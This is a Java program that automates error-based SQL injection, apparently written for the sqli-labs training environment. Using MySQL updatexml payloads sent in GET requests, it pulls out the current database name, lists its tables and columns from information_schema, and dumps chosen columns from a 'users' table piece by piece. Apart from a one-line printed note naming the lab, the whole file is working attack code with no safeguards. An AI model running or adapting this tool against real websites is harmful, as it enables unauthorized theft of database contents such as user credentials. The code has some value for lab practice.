import java.net.*;
import java.util.ArrayList;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.HashMap;
import java.util.Scanner;

public class ErrorInjection {
    private static final String USER_AGENT = "Mozilla/5.0";
    static Scanner scanner = new Scanner(System.in);
    private static String url;

    public static void main(String[] args) throws Exception {

        System.out.println("代码仅用于sqli-labs关卡");
        System.out.print("闭合后的URL:");
        url = scanner.nextLine();

        currentDB();
    }

    private static  String getResponse(String payload) throws Exception {

        URL url = new URL(payload);

        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("GET");
        connection.setRequestProperty("User-Agent", USER_AGENT);

        BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
        String line;
        StringBuilder response = new StringBuilder();
        while ((line = reader.readLine()) != null) {
            response.append(line);
        }
        reader.close();

        connection.disconnect();

        return response.toString();
    }

    public static void currentDB() throws Exception {
        // 使用+代替空格
        String payload = url + "+and+updatexml(1,concat(0x7e,(SELECT+database()),0x7e),1)+--+";
        String response = getResponse(payload);

        Pattern pattern = Pattern.compile("~(.*?)~");
        Matcher matcher = pattern.matcher(response);

        String db = "";
        if (matcher.find()) {
            db = matcher.group(1);
        } else {
            System.out.println("没有匹配到数据库");
        }
        System.out.println("current-db: " + db);

        currentTables();
    }


    public static void currentTables() throws Exception {
        String payload = url + "+and+updatexml(1,concat(1,(select+distinct+concat(0x7e,+(select+group_concat(table_name)),0x7e)+from+information_schema.tables+where+table_schema=database()),0x7e),1)+--+";
        String response = getResponse(payload);

        Pattern pattern = Pattern.compile("~(.*?)~");
        Matcher matcher = pattern.matcher(response);

        String tables = "";
        if (matcher.find()) {
            tables = matcher.group(1);
        } else {
            System.out.println("没有匹配到表名");
        }
        String[] tableList = tables.split(",");

        HashMap<Integer, String> tableMap = new HashMap<>();
        for (int i = 0; i < tableList.length; i++) {
            tableMap.put(i, tableList[i]);
        }

        System.out.println(tableMap);
        int index = scanner.nextInt();
        String table = tableMap.get(index);

        currentColumn(table);
    }

    private static void currentColumn(String table) throws Exception {
        String payload = url + String.format("+and+updatexml(1,concat(0x7e,(select+distinct+concat(0x7e,+(select+group_concat(column_name)),0x7e)+from+information_schema.columns+where+table_schema=database()+and+table_name='%s'),0x7e),1)+--+", table);
        String response = getResponse(payload);

        Pattern pattern = Pattern.compile("~~(.*?)~~");
        Matcher matcher = pattern.matcher(response);
        String columns = "";
        if (matcher.find()) {
            columns = matcher.group(1);
        } else {
            System.out.println("没有匹配到列名");
        }

        String[] columnList = columns.split(",");
        HashMap<Integer, String> columnMap = new HashMap<>();
        for (int i = 0; i < columnList.length; i++) {
            columnMap.put(i, columnList[i]);
        }
        System.out.println(columnMap);
        System.out.println("选择多个以空格分开");

        Scanner scanner = new Scanner(System.in);
        String str = scanner.nextLine();

        String[] strings = str.split(" ");

        int[] num = new int[strings.length];

        for (int i = 0; i < strings.length; i++) {
            num[i] = Integer.parseInt(String.valueOf(strings[i]));
        }
        ArrayList<String> queryColumn = new ArrayList<>();
        for (int i : num) {
            queryColumn.add(columnList[i]);
        }
        queryData(queryColumn);
    }

    private static void queryData(ArrayList<String> queryColumn) throws Exception {
        for (String column : queryColumn) {
            int i = 1;
            StringBuilder datas = new StringBuilder();
            while (true) {
                String payload = url + String.format("+and+updatexml(1,concat(0x7e,mid((select+group_concat(%s)+from+users),%d,31),0x7e),1)--+", column, i);
                String response = getResponse(payload);
                Pattern pattern = Pattern.compile("XPATH syntax error: '(.*?)'");
                Matcher matcher = pattern.matcher(response);
                String data = "";
                if (matcher.find()) {
                    data = matcher.group(1);
                }else {
                    System.out.println("没有查询到数据");
                }
                if (data.contains("~") && data.lastIndexOf("~") != data.indexOf("~")) {
                    datas.append(data.replace("~", ""));
                    break;
                } else {
                    datas.append(data.replace("~", ""));
                    i += 31;
                }
            }
            System.out.println(column + ":" + datas);
        }
    }

}
